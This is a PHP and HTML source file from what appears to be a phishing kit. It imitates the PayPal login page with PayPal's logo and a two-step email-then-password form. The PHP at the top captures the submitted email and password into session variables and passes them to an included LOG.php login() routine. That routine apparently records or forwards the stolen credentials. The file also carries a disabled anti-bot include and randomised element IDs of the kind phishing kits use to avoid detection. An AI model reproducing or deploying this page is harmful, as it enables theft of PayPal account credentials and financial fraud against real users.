<?php
session_start();
error_reporting(0);
@ini_set('display_errors', 0); 
date_default_timezone_set('GMT');
############## SECOND FILES ############## 
include('../config.php');
include('../func.php');
//include('../antibots.php');
include "../../lang".$_SESSION['Z-1-1-8'];
$time = date('d/m/Y G:i:s');
################## ACCOUNT INFORMATION #################
$_SESSION['_login_email_']    = $_POST['login_email'];
$_SESSION['_login_password_'] = $_POST['login_password'];
################## ACCOUNT INFORMATION #################
if(filter_var($_POST['login_email'], FILTER_VALIDATE_EMAIL)){
  include('LOG.php');
  login();
}
?>
<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro&display=swap" rel="stylesheet">

<style>
html {
    font-family: 'Source Sans Pro', sans-serif !important;

}
.text-divider{ line-height: 0; text-align: center;}
.text-divider span{background-color: #ffffff; padding: 7px; color: #7d8387;}
.text-divider:before{ content: " "; display: block; border-top: 1px solid #cbd2d6; border-bottom: 1px solid #f7f7f7;}
</style>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title><?php echo $Z118_01; ?></title>
    <link rel="stylesheet" href="../../lib/css/L-Z118.css">
    <link rel="shortcut icon" type="image/x-icon" href="../../lib/img//favicon.ico">
    <meta name="viewport" content="initial-scale=1.0">
    <style type="text/css"></style>
</head>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<body><p style="color: white;">.</p>
	<div for=" 47036701064 " id="page" name="Login">
        <div for=" 40386154720 " id="content" class="-content">
            <div id="ras-dafhaaa" class="ras-dafhaa">
			
            <div class="row align-items-center justify-content-center">
                <div class="col-lg-4 col-sm-6 col-xs-6 mt-4">
                        <div class="card mt-5">
                        <section id="login" class="card-body login">
                        <header class="mt-2">
                            <center>
                                <img style="width: 101px;" class="mb-4 mt-2" src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg"/>
                                <p style="font-size: 11px; font-weight:500;" id="uname"></p>
                            </center>
                        </header>
                            <form for=" a46d4ace14caf05f50af464dee58a718 " action="" method="POST" class="proceed maskable " id="formulario" name="login">
                                <div id="pass-sect" class="footer-sec">
                                <?php 
                                    if(isset($_GET['error_login'])){
                                        echo "
                                            <div class=\"error-assat\">
                                            <div class=\"lisar\"><img src=\"../../lib/img/error.png\"></div>
                                            <div class=\"liman\">".$Z118_13."</div>
                                            </div>";
                                    }
                                ?>
                                    <div class="">
                                        <style>
                                            .me  {
                                                display: inline-block;
                                            }
                                        </style>
                                        <div class="a-n-o-n-i-s-m-a" id="login_emaildiv">
                                            <div for=" 47528614218 " class="khana-jadida tikchb-ila ">
                                                <input style="font-size: 13px; border-color:#9da3a6; background-color: #ffffff;" for=" a46d4ace14caf05f50af464dee58a718 " class="form-control bg-white" name="login_email" type="email" placeholder="<?php echo $Z118_02; ?>" id="emay-add" value="<?php if(isset($_POST['login_email'])== true){ echo $_POST['login_email'];} ?>">
                                            </div>
                                            <div style="padding: 7px; margin:0px; font-size:14px; height:30px;" id=" 24303508334 " class="ghalat-assi">
                                                <p style="padding:0px;"><?php echo $Z118_04; ?></p>
                                            </div>
                                        </div>
                                        <div style="" id="login_passdiv" class="a-n-o-n-i-s-m-a">
                                            <div id=" 42512980078 " class="khana-jadida tikchb-ila ">
                                                <input style="font-size: 13px; border-color:#9da3a6; background-color: #ffffff;" for=" a46d4ace14caf05f50af464dee58a718 " class="form-control" name="login_password" type="password" placeholder="<?php echo $Z118_03; ?>" id="password">
                                            </div>
                                            <div style="padding: 7px; margin:0px; font-size:14px; height:30px;" id=" 24303508334 " class="ghalat-assi">
                                                <p style="padding:0px;"><?php echo $Z118_05; ?></p>
                                            </div>
                                        </div>
                                    </div>
                                    <div id=" 15125380847 " class="mt-4 af3a cuerpo">
                                        <input style="font-size: 14px; font-weight: 700; background-color: #0070ba;" for=" a46d4ace14caf05f50af464dee58a718 " class="btn btn-lg btn-block text-white" type="submit" id="botdkhol" name="botdkhol" value="Next"<?php echo $Z118_06; ?>>
                                    </div>
                                    <div>
                                        <p class="m-4 text-divider"><span>or</span></p>
                                    </div>
                                    <a style="font-size: 14px; font-weight: 700; background-color: #e1e7eb;" for=" 16160686035 " href="#" class="btn btn-light btn-block btn-lg text-dark btn-lg" id="ftahcont-jdid"><?php echo $Z118_08; ?></a></div>
                            </form>
                        </section>
                    </div>
                </div>
            </div>  
                
                <br>
            </div>
        </div>
        <div id=" 47941230950 " class="dorawlididor">
            <p id=" 38938929039 " class="anchofhhh"><?php echo $Z118_12; ?></p>
        </div>
    </div>
    <footer style="bottom:5px; height:20px; font-size:10px;"  id=" 33176255125 " class="footer footer-sec">
        <ul>
            <li id=" 75844226501676 "><a href="#">Contact Us</a></li>
            <li id=" 9244598635558 "><a href="#">Privacy</a></li>
            <li id=" 9244598635558 "><a href="#">Legal</a></li>
            <li id=" 377662692577883 "><a href="#">Worldwide</a></li>
        </ul>
        <br>
        <!--
        <ul id=" 22797998221 ">
            <li id=" 16475653093 "><a href="#" style="color: #9e9e9e;"><?php // echo $Z118_11; ?></a></li>
        </ul>
        -->
    </footer>


</html>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js" ></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
<script src="jquery-ui.js" ></script>

<script>
$(document).ready(function(){
    $('#login_passdiv').hide();
    $("#botdkhol").on('click',function(e){
        e.preventDefault();
        if($.trim($("#emay-add").val()) === ''){
            $("#emay-add").parent().next(".ghalat-assi").addClass("show");
            $("#emay-add").addClass("error-motalat");
            return false;
        } 
        $('#login_emaildiv').hide('slide', {direction: 'left'}, 0);
        $('#login_passdiv').show('slide', {direction: 'right'}, 0);
        $("#emay-add").parent().next(".ghalat-assi").removeClass("show");
        $("#uname").html($("#emay-add").val()+ '&nbsp;&nbsp;<a href="#" id="change" style="font-size: 11px; font-weight: 500;">Change</a>');
        $("#botdkhol").on('click',function(e){
            if($.trim($("#password").val()) === ''){
                $("#password").parent().next(".ghalat-assi").addClass("show");
                $("#password").addClass("error-motalat");
                return false;
            }
            $("#formulario").submit();
        });
        $("#change").on('click',function(){
                $('#login_emaildiv').show('slide', {direction: 'left'}, 0);
                $('#login_passdiv').hide('slide', {direction: 'right'}, 0);
                $("#uname").html('');
            }) 
            
        
        
        
        
        /** 
        var b = 0;
            $("#emay-add").val() || ($("#emay-add").parent().next(".ghalat-assi").addClass("show"), 
            $("#emay-add").addClass("error-motalat"), b = 1), $("#password").val() || ($("#password").parent().next(".ghalat-assi").addClass("show"), 
            $("#password").addClass("error-motalat"), $(".a-n-o-n-i-s-m-a").css("z-index: 100;"), 
            b = 1), 1 != b && ($(".dorawlididor").addClass("load-dayra"), $(".anchofhhh").show(), 
           
        }), 
        $("#emay-add").focus(function(a) {
            $("#emay-add").parent().next(".ghalat-assi").removeClass("show");
        }), 
        $("#password").focus(function(a) {
            $("#password").parent().next(".ghalat-assi").removeClass("show");
        });
        */
        
    })
})
</script>
